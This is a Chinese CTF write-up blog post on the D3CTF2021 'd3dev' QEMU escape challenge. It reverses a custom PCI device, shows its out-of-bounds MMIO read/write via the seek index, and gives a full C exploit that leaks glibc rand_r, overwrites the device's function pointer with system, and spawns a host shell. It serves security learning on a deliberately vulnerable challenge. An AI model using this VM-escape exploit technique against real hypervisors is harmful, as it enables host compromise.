@@ -1,0 +1,530 @@
+---
+layout: post
+title:  d3dev(D3CTF2021)
+date:   2024-08-20 00:08:01 +0300
+image:  2024-08-20-girl.jpg
+tags:   [ctf,Pwn,qemu]
+---
+
+直接把qemu丢进IDA分析，看一下qemu的启动脚本，可以看到有个device参数后面跟了个d3dev，这就是漏洞所在的**设备名**。
+
+launch.sh
+
+```assembly
+#!/bin/sh
+./qemu-system-x86_64 \
+-L pc-bios/ \
+-m 128M \
+-kernel vmlinuz \
+-initrd rootfs.img \
+-smp 1 \
+-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet" \
+-device d3dev \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic \
+-monitor /dev/null
+```
+
+因为qemu二进制文件里有DWARF调试信息，所以直接通过搜索函数名来定位相关函数是可以的，这里还有一种方法是从_start开始逐步跟下去找到初始化表，然后定位pci设备的注册表。
+
+具体流程: 
+
+_libc_csu_init→
+
+_frame_dummy_init_array_entry→
+
+do_qemu_init_pci_d3dev_register_types
+
+### do_qemu_init_pci_d3dev_register_types
+
+```assembly
+void __cdecl do_qemu_init_pci_d3dev_register_types()
+{
+  register_module_init(pci_d3dev_register_types, MODULE_INIT_QOM_0);
+}
+```
+
+### pci_d3dev_register_types
+
+```assembly
+void __cdecl pci_d3dev_register_types()
+{
+  type_register_static(&d3dev_info_27031);
+}
+```
+
+### d3dev_info_27031
+
+```assembly
+.data.rel.ro:0000000000B788A0 d3dev_info_27031 dq offset aD3dev        ; name
+.data.rel.ro:0000000000B788A0                                         ; DATA XREF: pci_d3dev_register_types+4↑o
+.data.rel.ro:0000000000B788A8                 dq offset env.tlb_table._anon_0+2E7Fh; parent ; "d3dev"
+.data.rel.ro:0000000000B788B0                 dq 1300h                ; instance_size
+.data.rel.ro:0000000000B788B8                 dq offset d3dev_instance_init; instance_init
+.data.rel.ro:0000000000B788C0                 dq 0                    ; instance_post_init
+.data.rel.ro:0000000000B788C8                 dq 0                    ; instance_finalize
+.data.rel.ro:0000000000B788D0                 db 0                    ; abstract
+.data.rel.ro:0000000000B788D1                 db 7 dup(0)
+.data.rel.ro:0000000000B788D8                 dq 0                    ; class_size
+.data.rel.ro:0000000000B788E0                 dq offset d3dev_class_init; class_init
+.data.rel.ro:0000000000B788E8                 dq 0                    ; class_base_init
+.data.rel.ro:0000000000B788F0                 dq 0                    ; class_finalize
+.data.rel.ro:0000000000B788F8                 dq 0                    ; class_data
+.data.rel.ro:0000000000B78900                 dq offset interfaces_27030; interfaces
+.data.rel.ro:0000000000B78908                 align 20h
+```
+
+定位到d3dev_class_init
+
+```assembly
+void __fastcall d3dev_class_init(ObjectClass_0 *a1, void *data)
+{
+  ObjectClass_0 *v2; // rax
+
+  v2 = object_class_dynamic_cast_assert(
+         a1,
+         (const char *)&env.tlb_table[1][115]._anon_0.dummy[31],
+         "/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c",
+         229,
+         "d3dev_class_init");
+  v2[1].unparent = (ObjectUnparent *)pci_d3dev_realize;
+  v2[1].properties = 0LL;
+  LODWORD(v2[2].object_cast_cache[0]) = 300426035;
+  BYTE4(v2[2].object_cast_cache[0]) = 16;
+  HIWORD(v2[2].object_cast_cache[0]) = 255;
+}
+```
+
+在函数d3dev_class_init里，可以找到设备的**vendor_id**和**device_id**，这两个值在后面查询pci设备的时候会用到，先记下来。
+
+> \>>hex(300426035)
+> '0x11e82333'
+
+**vendor=2333**
+
+**device=11E8**
+
+跟进pci_d3dev_realize函数里，这里分别定义了设备的两种I/O交互操作函数（即mmio和pmio）以及共享区域的大小（mmio为0x800），**以便qemu检查是否越界。**
+
+```assembly
+void __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)
+{
+  memory_region_init_io(
+    (MemoryRegion_0 *)&pdev[1],
+    &pdev->qdev.parent_obj,
+    &d3dev_mmio_ops,
+    pdev,
+    "d3dev-mmio",
+    0x800uLL);
+  pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&pdev[1]);
+  memory_region_init_io(
+    (MemoryRegion_0 *)&pdev[1].name[56],
+    &pdev->qdev.parent_obj,
+    &d3dev_pmio_ops,
+    pdev,
+    "d3dev-pmio",
+    0x20uLL);
+  pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&pdev[1].name[56]);
+}
+```
+
+在`d3dev_mmio_ops`和`d3dev_pmio_ops`两个结构体里面，可以找到对应的read、write函数: `d3dev_mmio_read`、`d3dev_mmio_write`和`d3dev_pmio_read`、`d3dev_pmio_write`.
+
+```assembly
+.data.rel.ro:0000000000B78920 ; const MemoryRegionOps_0 d3dev_pmio_ops
+.data.rel.ro:0000000000B78920 d3dev_pmio_ops  dq offset d3dev_pmio_read; read
+.data.rel.ro:0000000000B78920                                         ; DATA XREF: pci_d3dev_realize+56↑o
+.data.rel.ro:0000000000B78928                 dq offset d3dev_pmio_write; write
+.data.rel.ro:0000000000B78930                 dq 0                    ; read_with_attrs
+.data.rel.ro:0000000000B78938                 dq 0                    ; write_with_attrs
+.data.rel.ro:0000000000B78940                 dd DEVICE_LITTLE_ENDIAN ; endianness
+.data.rel.ro:0000000000B78944                 db 4 dup(0)
+.data.rel.ro:0000000000B78948                 dd 0                    ; valid.min_access_size
+.data.rel.ro:0000000000B7894C                 dd 0                    ; valid.max_access_size
+.data.rel.ro:0000000000B78950                 db 0                    ; valid.unaligned
+.data.rel.ro:0000000000B78951                 db 7 dup(0)
+.data.rel.ro:0000000000B78958                 dq 0                    ; valid.accepts
+.data.rel.ro:0000000000B78960                 dd 0                    ; impl.min_access_size
+.data.rel.ro:0000000000B78964                 dd 0                    ; impl.max_access_size
+.data.rel.ro:0000000000B78968                 db 0                    ; impl.unaligned
+.data.rel.ro:0000000000B78969                 db 3 dup(0)
+.data.rel.ro:0000000000B7896C                 db 4 dup(0)
+.data.rel.ro:0000000000B78970                 align 20h
+.data.rel.ro:0000000000B78980 ; const MemoryRegionOps_0 d3dev_mmio_ops
+.data.rel.ro:0000000000B78980 d3dev_mmio_ops  dq offset d3dev_mmio_read; read
+.data.rel.ro:0000000000B78980                                         ; DATA XREF: pci_d3dev_realize+27↑o
+.data.rel.ro:0000000000B78988                 dq offset d3dev_mmio_write; write
+.data.rel.ro:0000000000B78990                 dq 0                    ; read_with_attrs
+.data.rel.ro:0000000000B78998                 dq 0                    ; write_with_attrs
+.data.rel.ro:0000000000B789A0                 dd DEVICE_NATIVE_ENDIAN ; endianness
+.data.rel.ro:0000000000B789A4                 db 4 dup(0)
+.data.rel.ro:0000000000B789A8                 dd 0                    ; valid.min_access_size
+.data.rel.ro:0000000000B789AC                 dd 0                    ; valid.max_access_size
+.data.rel.ro:0000000000B789B0                 db 0                    ; valid.unaligned
+.data.rel.ro:0000000000B789B1                 db 7 dup(0)
+.data.rel.ro:0000000000B789B8                 dq 0                    ; valid.accepts
+.data.rel.ro:0000000000B789C0                 dd 0                    ; impl.min_access_size
+.data.rel.ro:0000000000B789C4                 dd 0                    ; impl.max_access_size
+.data.rel.ro:0000000000B789C8                 db 0                    ; impl.unaligned
+.data.rel.ro:0000000000B789C9                 db 3 dup(0)
+.data.rel.ro:0000000000B789CC                 db 4 dup(0)
+.data.rel.ro:0000000000B789D0                 align 20h
+```
+
+### 结构体
+
+```assembly
+00000000 struct_opaque   struc ; (sizeof=0x12F8, align=0x4, mappedto_7247)
+00000000 pdev            db 2272 dup(?)
+000008E0 mmio            db 240 dup(?)
+000009D0 pmio            db 240 dup(?)
+00000AC0 memory_mode     dd ?
+00000AC4 seek            dd ?
+00000AC8 init_flag       dd ?
+00000ACC mmio_read_part  dd ?
+00000AD0 mmio_write_part dd ?
+00000AD4 r_seed          dd ?
+00000AD8 blocks          dq 257 dup(?)
+000012E0 key             dd 4 dup(?)
+000012F0 rand_r          dq ?
+000012F8 struct_opaque   ends
+```
+
+### **d3dev_pmio_read**
+
+```assembly
+uint64_t __fastcall d3dev_pmio_read(struct_opaque *opaque, hwaddr addr, unsigned int size)
+{
+  uint64_t result; // rax
+
+  switch ( addr )
+  {
+    case 0uLL:
+      result = opaque->memory_mode;
+      break;
+    case 8uLL:
+      result = opaque->seek;
+      break;
+    case 0xCuLL:
+      result = opaque->key[0];
+      break;
+    case 0x10uLL:
+      result = opaque->key[1];
+      break;
+    case 0x14uLL:
+      result = opaque->key[2];
+      break;
+    case 0x18uLL:
+      result = opaque->key[3];
+      break;
+    default:
+      result = -1LL;
+      break;
+  }
+  return result;
+}
+```
+
+### d3dev_mmio_read
+
+```assembly
+uint64_t __fastcall d3dev_mmio_read(struct_opaque *opaque, hwaddr addr, unsigned int size)
+{
+  unsigned __int64 v3; // rax
+  int v4; // esi
+  unsigned int v5; // ecx
+  uint64_t result; // rax
+
+  v3 = opaque->field_AD8[opaque->seek + (unsigned int)(addr >> 3)];
+  v4 = -957401312;
+  v5 = v3;
+  result = HIDWORD(v3);
+  do
+  {
+    LODWORD(result) = result - ((v5 + v4) ^ (opaque->key[3] + (v5 >> 5)) ^ (opaque->key[2] + 16 * v5));
+    v5 -= (result + v4) ^ (opaque->key[1] + ((unsigned int)result >> 5)) ^ (opaque->key[0] + 16 * result);
+    v4 += 1640531527;
+  }
+  while ( v4 );
+  if ( opaque->mmio_read_part )
+  {
+    opaque->mmio_read_part = 0;
+    return (unsigned int)result;
+  }
+  else
+  {
+    opaque->mmio_read_part = 1;
+    return v5;
+  }
+}
+```
+
+### d3dev_pmio_write
+
+```assembly
+void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
+{
+  uint32_t *key; // rbp
+ 
+  if ( addr == 8 )
+  {
+    if ( val <= 0x100 )
+      opaque->seek = val;
+  }
+  else if ( addr > 8 )
+  {
+    if ( addr == 0x1C )
+    {
+      opaque->r_seed = val;
+      key = opaque->key;
+      do
+        *key++ = (opaque->rand_r)(&opaque->r_seed, 0x1CLL, val, *&size);
+      while ( key != &opaque->rand_r );
+    }
+  }
+  else if ( addr )
+  {
+    if ( addr == 4 )
+    {
+      *opaque->key = 0LL;
+      *&opaque->key[2] = 0LL;
+    }
+  }
+  else
+  {
+    opaque->memory_mode = val;
+  }
+}
+```
+
+seek的值也是可控的，控制seek就可以利用这个任意写漏洞。注意这里是通过index的方式访问内存，**数组元素大小为8字节**。而且这里调用了函数指针，可以将函数指针覆盖为system。
+
+### d3dev_mmio_write
+
+逐个函数分析，可以看到d3dev_mmio_write函数里面有一个**任意写**：
+
+```assembly
+void __fastcall d3dev_mmio_write(struct_opaque *opaque, hwaddr addr, uint64_t val, unsigned int size)
+{
+  __int64 v4; // rsi
+  char *v5; // r11
+  uint64_t v6; // rdx
+  int v7; // esi
+  unsigned int v8; // r10d
+  unsigned int v9; // r9d
+  unsigned int v10; // r8d
+  unsigned int v11; // edi
+  unsigned int v12; // ecx
+  uint64_t v13; // rax
+
+  if ( size == 4 )
+  {
+    v4 = opaque->seek + (unsigned int)(addr >> 3);
+    if ( LODWORD(opaque->mmio_write_part) )
+    {
+      v5 = &opaque->blocks[8 * v4];
+      v6 = val << 32;
+      v7 = 0;
+      LODWORD(opaque->mmio_write_part) = 0;
+      v8 = opaque->key[0];
+      v9 = opaque->key[1];
+      v10 = opaque->key[2];
+      v11 = opaque->key[3];
+      v12 = v6 + *((_DWORD *)v5 + 694);
+      v13 = (v6 + *((_QWORD *)v5 + 347)) >> 32;
+      do
+      {
+        v7 -= 1640531527;
+        v12 += (v7 + v13) ^ (v9 + ((unsigned int)v13 >> 5)) ^ (v8 + 16 * v13);
+        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 >> 5)) ^ (v10 + 16 * v12)) + v13;
+      }
+      while ( v7 != -957401312 );
+      *((_QWORD *)v5 + 347) = __PAIR64__(v13, v12);
+    }
+    else
+    {
+      LODWORD(opaque->mmio_write_part) = 1;
+      opaque->field_AD8[v4] = (unsigned int)val;  // 任意写
+    }
+  }
+}
+```
+
+通过查看结构体我们可以发现**blocks**的大小刚好是0x800，也就**是我们共享内存的区域**，在这里我们有val、addr可控，但实际上不能通过直接控制addr来溢出，因为**PCI设备在内部会检查这个地址是否越界。**
+
+### 整理
+
+由d3dev_pmio_write函数得知可为opaque->seek赋值范围为0~0x100，blocks有0x800字节，d3dev_mmio_read内的data = opaque->blocks[opaque->seek + (addr >> 3)]，此处的blocks是通过index的方式进行访存，而blocks又是dq的数据(8 bytes)，所以可以访问到的内存就是0-0x800，而通过addr进行越界读；
+
+d3dev_mmio_write也是如此，可以越界写，我们就有了任意读写d3devState这个**结构体附近**的内存的"能力".
+
+在pmio_write里将opaque->rand_r覆盖为system，opaque->r_seed覆盖为"/bin/sh"。
+
+### 计算seek值
+
+由于我们需要把rand_r的地址覆盖成system的地址，接下来需要计算共享内存开始到rand_r的偏移。从前面任意写漏洞可以知道blocks即是**共享内存**的区域，从blocks到rand_r的偏移是0x818，blocks是8字节数组，0x818/8=0x103就是数组的index值，我们可以直接把seek的值设置成0x100，然后将addr往后偏移3*8=24个字节即可对rand_r进行修改。
+
+设备的pci地址可以通过执行指令lspci来查看：
+
+```assembly
+/ # lspci
+00:01.0 Class 0601: 8086:7000
+00:04.0 Class 0200: 8086:100e
+00:00.0 Class 0600: 8086:1237
+00:01.3 Class 0680: 8086:7113
+00:03.0 Class 00ff: 2333:11e8
+00:01.1 Class 0101: 8086:7010
+00:02.0 Class 0300: 1234:1111
+```
+
+通过开头记下的vendor_id和device_id我们可以看出00:03.0对应的就是d3dev设备pci，然后通过cat /sys/devices/pci0000:00/0000:00:03.0/resource可以找到mmio和pmio的基址。
+
+```assembly
+/ # cat /sys/devices/pci0000:00/0000:00:03.0/resource
+0x00000000febf1000 0x00000000febf17ff 0x0000000000040200
+0x000000000000c040 0x000000000000c05f 0x0000000000040101
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+```
+
+**febf1000即为mmio基址，c040即为pmio基址。**
+
+~~写一个Makefile~~
+
+```
+exp:
+    musl-gcc exp.c -o exp --static -Os
+    strip -s exp
+    find . | cpio -H newc -ov -F ../rootfs.cpio
+    rm exp
+```
+
+### 解包编译打包
+
+```assembly
+#!/bin/sh
+mkdir ./rootfs
+cd ./rootfs
+cpio -idmv < ../rootfs.img
+mkdir root
+
+cp ../exp.c ./root
+gcc -o ./root/exp -static ./root/exp.c
+
+find . | cpio -o --format=newc > ../rootfs.cpio
+
+cd ..
+rm -rf ./rootfs
+```
+
+exp
+
+```assembly
+#include <fcntl.h>
+#include <inttypes.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/io.h>
+ 
+#define libc_system_offset 0x55410
+#define libc_rand_r_offset 0x4aeb0
+ 
+const uint32_t mmio_phy_base = 0xfebf1000;
+const uint32_t mmio_mem_size = 0x800;
+const uint32_t pmio_phy_base = 0xc040;
+ 
+const char sys_mem_file[] = "/dev/mem";
+ 
+uint64_t mmio_mem = 0x0;
+ 
+int die(const char *err_info){
+    printf("[-] Exit with: %s\n.", err_info);
+    exit(-1);
+}
+ 
+void *mmap_file(const char *filename, uint32_t size, uint32_t offset){
+    int fd = open(filename, O_RDWR|O_SYNC);
+    if(fd<0){
+        printf("[-] Can not open file: '%s'.\n", filename);
+        die("OPEN ERROR!");
+    }
+    void *ptr = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
+    if(ptr==MAP_FAILED){
+        printf("[-] Can not mmap file: '*%s'.\n", filename);
+        die("MMAP ERROR!");
+    }
+    close(fd);
+    return ptr;
+}
+ 
+//mmio op
+void mmio_write(uint64_t addr, uint64_t val){
+    *(uint64_t *)(mmio_mem+addr) = val;
+}
+ 
+uint64_t mmio_read(uint64_t addr){
+    return *(uint64_t *)(mmio_mem+addr);
+}
+ 
+//pmio op
+void pmio_write(uint32_t addr, uint32_t val){
+    outl(val, pmio_phy_base+addr);
+}
+ 
+uint32_t pmio_read(uint32_t addr){
+    return inl(pmio_phy_base+addr);
+}
+ 
+void decode(uint32_t v[2]){
+    uint32_t i = 0;
+    do{
+        i -= 0x61C88647;
+        v[0] += ((v[1]<<4))^(v[1]+i)^((v[1]>>5));
+        v[1] += ((v[0]<<4))^(v[0]+i)^((v[0]>>5));
+    } while(i!=0xC6EF3720);
+}
+ 
+void encode(uint32_t v[2]){
+    uint32_t i = 0xC6EF3720;
+    do{
+        v[1] -= ((v[0]<<4))^(v[0]+i)^((v[0]>>5));
+        v[0] -= ((v[1]<<4))^(v[1]+i)^((v[1]>>5));
+        i += 0x61C88647;
+    } while(i);
+}
+ 
+int main(){
+    mmio_mem = (uint64_t)mmap_file(sys_mem_file, mmio_mem_size, mmio_phy_base);
+    printf("[+] Mmap mmio physical memory to [%p-%p].\n", (void *)mmio_mem, (void *)(mmio_mem+mmio_mem_size));
+    if(iopl(3)) die("PMIO PERMISSION ERROR!");
+ 
+    pmio_write(0, 1);        // memory_mode = 1
+    pmio_write(4, 0);        // key[0-3] = 0
+    pmio_write(8, 0x100);    // seek = 0x100
+    printf("[*] Set block seek: %#x.\n", pmio_read(8));
+ 
+    uint64_t glibc_randr = mmio_read(24);
+    decode(&glibc_randr);
+    printf("[*] rand_r@glibc %#lx.\n", glibc_randr);
+    uint64_t glibc_system = glibc_randr-libc_rand_r_offset+libc_system_offset;
+    printf("[+] system@glibc: %#lx.\n", glibc_system);
+ 
+    encode(&glibc_system);
+    printf("[*] Overwrite rand_r ptr.\n");
+    mmio_write(24, glibc_system);
+ 
+    pmio_write(28, 0x6873);    // "sh"
+    return 0;
+}
+```
+
+我这里用的ubuntu22.04直接bus error，换用ubuntu20.04
+
+参考链接：
+
+https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458382818&idx=1&sn=e6de0a1bc04d51c1edade0a531f54e73&chksm=b180c16886f7487ec647ca4518bacf921f88f1cc0a2dfd060d73d9963ae08d28be32c7692e9b&scene=27
+
+https://bbs.kanxue.com/thread-275216.htm#msg_header_h2_6
